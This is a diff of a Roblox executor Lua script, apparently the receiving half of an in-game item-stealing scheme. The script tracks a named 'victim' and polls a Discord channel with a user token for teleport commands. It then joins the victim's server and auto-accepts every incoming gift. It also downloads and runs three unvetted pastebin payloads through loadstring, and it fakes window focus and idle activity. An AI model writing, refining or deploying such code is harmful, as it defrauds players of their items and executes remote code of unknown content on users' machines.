@@ -1,141 +1,162 @@
-if not game:IsLoaded() then
-    game.Loaded:Wait()
+if not game:IsLoaded() then 
+	game.Loaded:Wait()
 end
-local a = game:GetService("UserInputService")
-local b = game:GetService("RunService")
-local function c()
+
+-- Services needed for the focus mimic
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+-- Function to check and print focus status (always reports "IN FOCUS")
+local function checkActivityStatus()
     print("Roblox window is IN FOCUS.")
 end
-b.Heartbeat:Connect(
-    function()
-        local d = false
-        local e = _G.RobloxFocusStatus
-        if e == nil then
-            c()
-            _G.RobloxFocusStatus = d
-        elseif d and not e or not d and e then
-            c()
-            _G.RobloxFocusStatus = d
-        end
+
+-- Periodically update the status to always be "in focus" in the console.
+RunService.Heartbeat:Connect(function()
+    -- This logic ensures "Roblox window is IN FOCUS." is printed consistently
+    -- without spamming, by only printing if the *reported* status would change
+    -- (which it won't, as currentStatusIsInactive is always false).
+    local currentStatusIsInactive = false 
+    local lastStatus = _G.RobloxFocusStatus 
+
+    if lastStatus == nil then 
+        checkActivityStatus()
+        _G.RobloxFocusStatus = currentStatusIsInactive
+    elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
+        checkActivityStatus()
+        _G.RobloxFocusStatus = currentStatusIsInactive
     end
-)
-c()
+end)
+
+-- Initial check when the script starts for console output
+checkActivityStatus()
+
+
 if token == "" or channelId == "" then
     game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
-loadstring(game:HttpGet("https://pastebin.com/raw/xBLu3qtF", true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/vbLfSAFd", true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/xmJDRh2j", true))()
-local f = game:GetService("VirtualUser")
-game:GetService("Players").LocalPlayer.Idled:Connect(
-    function()
-        f:CaptureController()
-        f:ClickButton2(Vector2.new())
-    end
-)
-local g = game:GetService("HttpService")
-local h = game:GetService("VirtualInputManager")
-local i = isfile("user_gag.txt")
-local j = isfile("joined_ids.txt")
-if not i then
+
+loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
+loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()
+loadstring(game:HttpGet('https://pastebin.com/raw/xmJDRh2j', true))()
+
+
+
+local bb = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:Connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
+end)
+
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local victimFile = isfile("user_gag.txt")
+local joinedFile = isfile("joined_ids.txt")
+if not victimFile then
     writefile("user_gag.txt", "victim username")
 end
-if not j then
+if not joinedFile then
     writefile("joined_ids.txt", "[]")
 end
-local k = readfile("user_gag.txt")
-local l = g:JSONDecode(readfile("joined_ids.txt"))
-local m = false
-local n = 0
-local o = nil
-local function p(q)
-    table.insert(l, q)
-    writefile("joined_ids.txt", g:JSONEncode(l))
+local victimUser = readfile("user_gag.txt")
+local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
+local didVictimLeave = false
+local timer = 0
+local lastMessageId = nil
+
+local function saveJoinedId(messageId)
+    table.insert(joinedIds, messageId)
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
-local function r()
-    local s
-    s =
-        game.Players.PlayerRemoving:Connect(
-        function(t)
-            if t.Name == k then
-                if s then
-                    s:Disconnect()
-                end
-                m = true
+
+local function waitForPlayerLeave()
+    local connection
+    connection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUser then
+            if connection then
+                connection:Disconnect()
             end
+            didVictimLeave = true
         end
-    )
+    end)
 end
-r()
-local u = game:GetService("Players")
-local v = u.LocalPlayer
-while v:GetAttribute("DataFullyLoaded") ~= true do
-    v:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
+
+waitForPlayerLeave()
+
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+
+while plr:GetAttribute("DataFullyLoaded") ~= true do
+    plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
 end
-while v:GetAttribute("Finished_Loading") ~= true do
-    v:GetAttributeChangedSignal("Finished_Loading"):Wait()
+while plr:GetAttribute("Finished_Loading") ~= true do
+    plr:GetAttributeChangedSignal("Finished_Loading"):Wait()
 end
-while v:GetAttribute("Loading_Screen_Finished") ~= true do
-    v:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
+while plr:GetAttribute("Loading_Screen_Finished") ~= true do
+    plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
 end
+
 wait(1)
-local w = v:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
-local function x()
+local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")
+
+local function acceptGifts()
     while task.wait(0.1) do
-        for y, z in pairs(w:GetChildren()) do
-            if z:IsA("ImageLabel") then
-                local A = z:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
-                replicatesignal(A.MouseButton1Click)
+        for _, v in pairs(giftNoti:GetChildren()) do
+            if v:IsA("ImageLabel") then
+                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
+                replicatesignal(acceptImageButton.MouseButton1Click)
             end
         end
     end
 end
-task.spawn(x)
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Trading")
+
+task.spawn(acceptGifts)
+
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo webhook')
 wait(0.5)
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Trading")
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('invite link is Dx6F8EJ9sD')
 wait(0.5)
-game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Thanks brooo, check your clipboard")
-local function B()
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')
+
+local function increaseTimer()
     while task.wait(1) do
-        n = n + 1
+        timer = timer + 1
     end
 end
-task.spawn(B)
-local function C()
-    local D =
-        request(
-        {
-            Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=1",
-            Method = "GET",
-            Headers = {
-                ["Authorization"] = token,
-                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-                ["Content-Type"] = "application/json"
-            }
+
+task.spawn(increaseTimer)
+
+local function autoJoin()
+    local response = request({
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
+        Method = "GET",
+        Headers = {
+            ['Authorization'] = token,
+            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+            ['Content-Type'] = 'application/json'
         }
-    )
-    if D.StatusCode == 200 then
-        local E = g:JSONDecode(D.Body)
-        if #E == 0 then
-            return
-        end
-        local F = E[1]
-        if F.id == o or table.find(l, tostring(F.id)) then
-            return
-        end
-        local G = F.content or ""
-        local H, I = string.match(G, 'TeleportToPlaceInstance%((%d+),%s*[\'"]([%w%-]+)[\'"]%)')
-        if H and I then
-            o = F.id
-            p(tostring(F.id))
+    })
+
+    if response.StatusCode == 200 then
+        local messages = HttpServ:JSONDecode(response.Body)
+        if #messages == 0 then return end
+
+        local message = messages[1]
+        if message.id == lastMessageId or table.find(joinedIds, tostring(message.id)) then return end
+
+        local content = message.content or ""
+        local placeId, jobId = string.match(content, "TeleportToPlaceInstance%((%d+),%s*['\"]([%w%-]+)['\"]%)")
+        if placeId and jobId then
+            lastMessageId = message.id
+            saveJoinedId(tostring(message.id))
             writefile("user_gag.txt", "unknown")
-            game:GetService("TeleportService"):TeleportToPlaceInstance(H, I)
+            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
         end
     else
-        print("Invalid response code:", D.StatusCode)
+        print("Invalid response code:", response.StatusCode)
     end
 end
+
 while task.wait(5) do
-    C()
+    autoJoin()
 end
